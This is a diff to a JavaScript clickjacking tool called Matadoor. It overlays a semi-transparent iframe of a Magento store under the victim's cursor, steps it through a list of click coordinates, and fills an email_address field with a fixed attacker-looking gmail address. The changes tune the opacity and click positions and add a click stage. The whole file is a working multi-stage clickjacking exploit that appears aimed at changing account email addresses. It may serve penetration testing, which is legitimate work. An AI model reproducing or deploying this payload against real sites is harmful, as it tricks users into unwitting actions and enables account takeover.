@@ -17,7 +17,7 @@
       //Matadoor allows for clickjacking involving multiple stages. After each click in the iFrame - it moves the iFrame to the next (x,y) co-ordinates. Matadoor monitors which element has browser's focus. Moment when the iFrame receives the focus is interpretted as a click inside the iFrame. But that can just as well be caused by a text field or a button popping up inside that iFrame. For this reason for few seconds after the iFrame is created, and for few seconds after each click the Matadoor gets numb - will not react to any focus changes. Those values (in seconds) are kept in numbAfterStart and numbAfterClick variables. Those variables should cover the time till all elements in the iFrame are fully loaded (and hence will not be stealing focus any more).
       //Matadoor renders vulnerable iFrame under the pointer of a mouse whenever it is over a clickable object. Removes the iFrame when the pointer leaves the clickable object. Clickable objects are defined by variable clickableClassName and array clickableTagNames
 
-      var matadoorInput = {"startURL":"https://magento.test/","numbAfterStart":"4","frameWidth":"1680","frameHeight":"1224","iOpacity":0.60,"actionList":[{"x":1448,"y":19,"numbAfterClick":"2"},{"x":1333,"y":95,"numbAfterClick":"2"},{"x":739,"y":800,"numbAfterClick":"2"},{"x":795,"y":445,"numbAfterClick":"2"},{"x":599,"y":765,"numbAfterClick":"2"}],"clickableTagNames":["A","INPUT","BUTTON"],"clickableClassName":"MATADOOR_CLICKABLE"}
+      var matadoorInput = {"startURL":"https://magento.test/","numbAfterStart":"4","frameWidth":"1680","frameHeight":"1224","iOpacity":0.5,"actionList":[{"x":1443,"y":26,"numbAfterClick":"2"},{"x":1361,"y":94,"numbAfterClick":"2"},{"x":728,"y":819,"numbAfterClick":"2"},{"x":686,"y":452,"numbAfterClick":"2"},{"x":595,"y":755,"numbAfterClick":"2"},{"x":743,"y":42,"numbAfterClick":"2"}],"clickableTagNames":["A","INPUT","BUTTON"],"clickableClassName":"MATADOOR_CLICKABLE"}
 
       // -----------------CODE BELOW THIS LINE IS ALWAYS THE SAME------------------
       var mouseX=0;
@@ -43,7 +43,6 @@
       {
          document.getElementsByTagName("body")[0].innerHTML="<iframe id='ownFrame' src='"+window.location.href+"' style='position: fixed; top: 0px; bottom: 0px; right: 0px; width: 100%; border: none; margin: 0; padding: 0; overflow: hidden; height: 100%;' ></iframe><input type='text' id='dummy' style='width:1px; height:1px; opacity:0'> <div id='mouseUpBlock' style='position:absolute;top:0;left:0;bottom:0;right:0;height:300px;width:100%;z-index: 11;background-color: rgba(155, 0, 0, 0.0)';></div><div id='mouseDownBlock' style='position:absolute;top:0;left:0;bottom:0;right:0;height:300px;width:100%;z-index: 11;background-color: rgba(155, 0, 0, 0.0)';></div><div id='mouseRightBlock' style='position:absolute;top:0;left:0;bottom:0;right:0;height:100%;width:300px;z-index: 11;background-color: rgba(155, 0, 0, 0.0)';></div><div id='mouseLeftBlock' style='position:absolute;top:0;left:0;bottom:0;right:0;height:100%;width:300px;z-index: 11;background-color: rgba(155, 0, 0, 0.0)';></div> <iframe id='frame' src='"+ matadoorInput.startURL + "' style='width: "+ matadoorInput.frameWidth +"px;height: "+ matadoorInput.frameHeight + "px;position: absolute;left: -40;top: 130;z-index: 10;opacity: " +matadoorInput.iOpacity +";' ></iframe>";
          document.getElementsByTagName("body")[0].style="overflow: hidden;";
-         document.getElementById("email_address").value = "nikashio42@gmail.com"
          keepFocusOnTextField();
          function isClickable(element) {
             var node = element;
@@ -65,6 +64,9 @@
             document.getElementById("mouseDownBlock").style.top=(y+3)+"px";
             document.getElementById("mouseRightBlock").style.left=(x+3)+"px";
             document.getElementById("mouseLeftBlock").style.left=(x-303)+"px";
+            if (document.getElementById("email_address")) {
+               document.getElementById("email_address").value = "nikashio42@gmail.com"
+            }
             var hoverElement = document.getElementById("ownFrame").contentWindow.document.elementFromPoint(mouseX, mouseY);
             if (isClickable(hoverElement))
             {
